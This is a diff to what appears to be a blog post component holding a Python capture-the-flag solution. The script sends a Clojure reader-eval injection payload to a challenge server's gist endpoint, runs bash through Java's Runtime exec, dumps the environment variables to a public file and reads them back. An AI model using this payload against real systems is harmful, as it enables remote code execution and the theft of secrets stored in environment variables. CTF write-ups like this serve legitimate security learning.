@@ -16,14 +16,14 @@ export default function Post() {
                     url = "https://a5f6bcb2307b2e9bcf64ffd9a382f720.chal.ctf.ae"
                     s.get(url + "/?username=admin&redirect=/gists")
                     s.post(url + "/gists", data={
-                        # "gist": '#=(* 7 7)'
-                        "gist": '#=(eval\\
-                            (.\\
-                                (java.lang.Runtime/getRuntime)\\
-                                exec\\
-                                (into-array ["bash" "-c" "export > ./resources/public/static/1.txt"])\\
-                            )\\
-                        )',
+                        # "gist": "#=(* 7 7)"
+                        "gist": """#=(eval\\
+                                    (.\\
+                                        (java.lang.Runtime/getRuntime)\\
+                                        exec\\
+                                        (into-array ["bash" "-c" "export > ./resources/public/static/1.txt"])\\
+                                    )\\
+                                )""",
                     })
                     resp = s.get(url + "/static/1.txt")
                     print(resp.text)
